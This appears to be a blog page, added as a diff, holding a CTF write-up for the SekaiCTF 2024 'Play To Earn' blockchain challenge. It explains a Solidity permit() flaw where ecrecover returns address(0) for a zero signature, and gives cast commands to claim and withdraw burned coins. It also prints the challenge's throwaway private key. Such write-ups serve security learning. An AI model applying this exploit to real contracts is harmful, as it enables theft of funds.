@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+   <meta name="description" content="Difficulty : Easy to medium
+Team : Phreaks2600
+Source files You can buy coins.
+Of course, you can exchange it back to cash at the original purchase price if there is any left after playing :)
+TL;DR Start an instance Register my address Exploit bad ecdsa signature verification to set myself some fund to transferc coins from another address to myself transfer coin from address(0) to my address withdraw the ether an get the coin Introduction We got three contracts ArcadeMachine.">  
+
+  <title>
+    
+      Project Sekai 2024 - Play To Earn [blockchain]
+    
+  </title>
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/" />
+  
+  
+  
+  <link rel="stylesheet" href="/css/main.c239d1e3ec2e14e03f007253c150c0b0981a0c7a7aa2f99b4f1f7828b27e3131403a05fdbbea59f487b6881cb2582a708b8646de332069e002ffef9fc9a48f89.css" integrity="sha512-wjnR4&#43;wuFOA/AHJTwVDAsJgaDHp6ovmbTx94KLJ&#43;MTFAOgX9u&#43;pZ9Ie2iByyWCpwi4ZG3jMgaeAC/&#43;&#43;fyaSPiQ==" />
+  
+</head>
+<body a="dark">
+        <main class="page-content" aria-label="Content">
+            <div class="w">
+<a href="/">../</a>
+
+
+<article>
+    <p class="post-meta">
+        <time datetime="2024-08-28 20:38:48 &#43;0200 CEST">
+            2024-08-28
+        </time>
+    </p>
+
+    <h1>Project Sekai 2024 - Play To Earn [blockchain]</h1>
+
+    
+        <aside >
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#setup">Setup</a></li>
+    <li><a href="#recon">Recon</a></li>
+    <li><a href="#vulnerability">Vulnerability</a></li>
+  </ul>
+</nav>
+        </aside>
+    
+
+    <blockquote>
+<p>Difficulty : Easy to medium</p>
+</blockquote>
+<blockquote>
+<p>Team : Phreaks2600</p>
+</blockquote>
+<blockquote>
+<p><a href="https://github.com/project-sekai-ctf/sekaictf-2024/tree/main/blockchains/play-to-earn"> Source files </a></p>
+</blockquote>
+<blockquote>
+<p>You can buy coins.</p>
+<p>Of course, you can exchange it back to cash at the original purchase price if there is any left after playing :)</p>
+</blockquote>
+<h1 id="tldr">TL;DR</h1>
+<ul>
+<li>Start an instance</li>
+<li>Register my address</li>
+<li>Exploit bad ecdsa signature verification to set myself some fund to transferc coins from another address to myself</li>
+<li>transfer coin from address(0) to my address</li>
+<li>withdraw the ether an get the coin</li>
+</ul>
+<h1 id="introduction">Introduction</h1>
+<p>We got three contracts <code>ArcadeMachine.sol</code>, <code>Coin.sol</code> and <code>Setup.sol</code></p>
+<p>The main contract is <code>Coin.sol</code> which have the ether to steal.</p>
+<p>To solve the challenge we need to have 13.37 or more ether on our balance and to be registered, in <code>Setup</code> contract :</p>
+<pre><code class="language-solidity">function isSolved() external view returns (bool) {
+        return player != address(0) &amp;&amp; player.balance &gt;= 13.37 ether;
+    }
+</code></pre>
+<p>To register we have to interact with <code>Setup</code> with the function <code>Register</code></p>
+<pre><code class="language-solidity">function register() external {
+        require(player == address(0));
+        player = msg.sender;
+        coin.transfer(msg.sender, 1337);    // free coins for new players :)
+    }
+</code></pre>
+<h2 id="setup">Setup</h2>
+<p>But before all of that we got to start instance, i will be short on this part but all we had to interact with the server and choose to start an instance with the command:
+<code>ncat --ssl play-to-earn.chals.sekai.team 1337</code>.</p>
+<p>And it will give us the setup address, my address, my private key, and URL and a personnal UUID for identifiying myself and get the flag.</p>
+<p>And we can get Coin and ArcadeMachine addresses by using cast on Setup contract as they are defined in the latter:</p>
+<pre><code class="language-solidity">contract Setup {
+
+    Coin public coin;
+    ArcadeMachine public arcadeMachine;
+
+    address player;
+	
+	...
+</code></pre>
+<p>For Coin : <code>cast call -r $RPC $SETUP &quot;coin()&quot;</code></p>
+<p>For ArcadeMachine : <code>cast call -r $RPC $SETUP &quot;arcadeMachine()&quot;</code></p>
+<p>I set up an environment variable via a file <code>.env</code> file to go faster and a way to get Coin and ArcadeMachine address automatically each time i apply the <code>.env</code> file with <code>source .env</code>.</p>
+<pre><code class="language-bash">MY_UUID=05d37b3f-db11-4398-a036-fe2de2532bdd
+RPC=https://play-to-earn.chals.sekai.team/05d37b3f-db11-4398-a036-fe2de2532bdd
+PKEY=0x9f9ab104ea0ea88cbfea172e21ef9ad3c779039b16d0403ea4b69714b68570fc
+ADDRESS=0x7689DDAcC618C9FABca377B7630E5C5546726139
+SETUP=0x85f5C75dd2A6e4F6e046F74921aDf2FD25496F05
+
+ARCADEMACHINE=&quot;0x$(cast call $SETUP -r $RPC &quot;arcadeMachine()&quot; | tail -c 41)&quot;
+COIN=&quot;0x$(cast call $SETUP -r $RPC &quot;coin()&quot; | tail -c 41)&quot;
+
+alias check_wallet='cast balance $ADDRESS -r $RPC'
+</code></pre>
+<p><code>check_wallet</code> is to rapidly check if the instance is still up because we only got 30 minutes per instance.</p>
+<h2 id="recon">Recon</h2>
+<p>Now i can register : <code>cast send -r $RPC --private-key $PKEY $SETUP &quot;register()&quot; </code> which grant e=me 1337 coins.</p>
+<p>Using <code>withdraw()</code> from Coin i can convert this coin to ether.</p>
+<p>Also the challenge name <code>Play to earn</code> stand for the ability to play the arcade machine using the function <code>play(uint256)</code></p>
+<pre><code class="language-solidity">function play(uint256 times) external {
+        // burn the coins
+        require(coin.transferFrom(msg.sender, address(0), 1 ether * times));
+        // Have fun XD
+    }
+</code></pre>
+<p>It transferFrom(src, dst) so it transfer something to sender to address(0) (which is an address with only zero, so it corresponds to nothing : <code>0x0000000000000000000000000000000000000000</code>)</p>
+<p>Let&rsquo;s look at <code>transferFrom()</code>:</p>
+<pre><code class="language-solidity">function transferFrom(address src, address dst, uint wad)
+        public
+        returns (bool)
+    {
+        require(balanceOf[src] &gt;= wad);
+
+        if (src != msg.sender &amp;&amp; allowance[src][msg.sender] != type(uint256).max) {
+            require(allowance[src][msg.sender] &gt;= wad);
+            allowance[src][msg.sender] -= wad;
+        }
+
+        balanceOf[src] -= wad;
+        balanceOf[dst] += wad;
+
+        emit Transfer(src, dst, wad);
+
+        return true;
+    }
+</code></pre>
+<p>If the dst != src and the allowance of the sender on src allowance list is different to uint256 = 115792089237316195423570985008687907853269984665640564039457584007913129639936 (these conditions are always True in this challenge if you transfer coin to another account)</p>
+<p>Then it require msg.sender to have enough allowance on src account.</p>
+<p>So it transfer coin from src account to dst account (if src != msg.sender, substract the value to transfer from msg.sender allowance on src) and then substract the transferred amount from src coin balance and increase dst balance.</p>
+<p>Then, <code>play(uint256 times)</code> function transfer 1 ether == 10**18 * times to msg.sender coin balance to address(0) coin balance.</p>
+<p>From the challenge scenario, <code>play(19)</code> is used at setup that&rsquo;s why there is a comment saying people played before us.</p>
+<pre><code class="language-solidity">    constructor() payable {
+        coin = new Coin();
+        arcadeMachine = new ArcadeMachine(coin);
+
+        // Assume that many people have played before you ;)
+        require(msg.value == 20 ether);
+        coin.deposit{value: 20 ether}();
+        coin.approve(address(arcadeMachine), 19 ether);
+        arcadeMachine.play(19);
+    }
+</code></pre>
+<p>So actually, address(0) got a balance of 19 ** 10**18 coins, which will makes 19 ether if they are withdrawn.</p>
+<p>To get these we need to find a way to transfer coins from address(0) balance to our balance using <code>transferFrom()</code>, for that we need to have an allowance amount superior equal the value we want to transfer and then withdraw them.</p>
+<p>To make short, we have two interesting functions, <code>privilegeWithdraw</code> and <code>permit</code>.</p>
+<p>The first one transfer address(0) coin to msg.sender but we need to be the owner of the contract so it sucks.</p>
+<pre><code class="language-solidity">function privilegedWithdraw() onlyOwner external {
+        uint wad = balanceOf[address(0)];
+        balanceOf[address(0)] = 0;
+        payable(msg.sender).transfer(wad);
+        emit PrivilegedWithdrawal(msg.sender, wad);
+    }
+</code></pre>
+<p>The second one ask us to set allowance value for a <code>spender</code> address on <code>owner</code> address if we manage to confirm we are the owner by verifiying a signature with ecdsa.</p>
+<pre><code class="language-solidity"> function permit(
+        address owner,
+        address spender,
+        uint256 value,
+        uint256 deadline,
+        uint8 v,
+        bytes32 r,
+        bytes32 s
+    ) external {
+        require(block.timestamp &lt;= deadline, &quot;signature expired&quot;);
+        bytes32 structHash = keccak256(
+            abi.encode(PERMIT_TYPEHASH, owner, spender, value, nonces[owner]++, deadline)
+        );
+        bytes32 h = _hashTypedDataV4(structHash);
+        address signer = ecrecover(h, v, r, s);
+        require(signer == owner, &quot;invalid signer&quot;);
+        allowance[owner][spender] = value;
+</code></pre>
+<p>So we need to have <code>signer == owner</code> meaning : <code>ecrecover(h,v,r,s) == 0x0000000000000000000000000000000000000000</code></p>
+<h2 id="vulnerability">Vulnerability</h2>
+<p>Here the vulnerability is that we can choose the v, r and s parameter in order to get a null signature.</p>
+<p>Testing <code>ecrecover()</code> locally i found that with any <code>h</code> if <code>v = r = s = 0</code> , then <code>ecrecover(h,v,r,s) == 0 == address(0)</code></p>
+<p>With this test contract :</p>
+<pre><code class="language-solidity">pragma solidity ^0.8.25;
+
+contract Testsignatures {
+
+    bytes32 public hash = 0x24c36029f1c6a76aeef30e9ab8c3eeacb5609cc1ee2962e660ce2313c5696c4a;
+    uint8 public v = 0;
+    bytes32 public r = 0x0000000000000000000000000000000000000000000000000000000000000000;
+    bytes32 public s = 0x0000000000000000000000000000000000000000000000000000000000000000;
+
+    address public signer = 0x55EB72D6588c64E202AA006b4Ea380275E9A4B25;
+    
+    function sign() public {
+
+        signer = ecrecover(hash, v, r, s);
+    }
+    
+
+}
+</code></pre>
+<h1 id="solving">Solving</h1>
+<p>So finally we need to :</p>
+<ul>
+<li>register</li>
+<li>call permit() with <code>owner=address(0), spender=our_address, value=19*10**18, deadline=timestamp, v=0, r=0 and s=0</code></li>
+<li>transfer coins</li>
+<li>withdraw</li>
+<li>get flag.</li>
+</ul>
+<p>calling permit : <code>cast send -r $RPC --private-key $PKEY $COIN &quot;permit(address,address,uint256,uint256,uint8,bytes32,bytes32)&quot; $(cast address-zero) $ADDRESS 18000000000000000000 1732416543 0 $(cast to-bytes32 0) $(cast to-bytes32 0)</code></p>
+<p>I can now check my allowance on address(0) allowance mapping : <code>cast call $COIN -r $RPC &quot;allowance(address, address)(uint)&quot; $(cast address-zero) $ADDRESS</code> -&gt; 1.8e+19</p>
+<p>I now transfer my self the coin : <code>cast send -r $RPC --private-key $PKEY $COIN &quot;transferFrom(address,address,uint256)&quot; $(cast address-zero) $ADDRESS 18000000000000000000</code></p>
+<p>And withdraw them : <code>cast send $COIN -r $RPC --private-key $PKEY &quot;withdraw(uint)&quot; 18000000000000000000</code> -&gt; 18.999999999999776957</p>
+<p>Now i can interact with instance, submit my uuid and get the flag : <code>SEKAI{0wn3r:wh3r3_4r3_mY_c01n5_:&lt;}</code></p>
+<h1 id="references">References</h1>
+<p><a href="https://docs.soliditylang.org/en/latest/solidity-by-example.html#recovering-the-message-signer-in-solidity">https://docs.soliditylang.org/en/latest/solidity-by-example.html#recovering-the-message-signer-in-solidity</a></p>
+
+</article>
+
+            </div>
+        </main>
+    </body>
+</html>
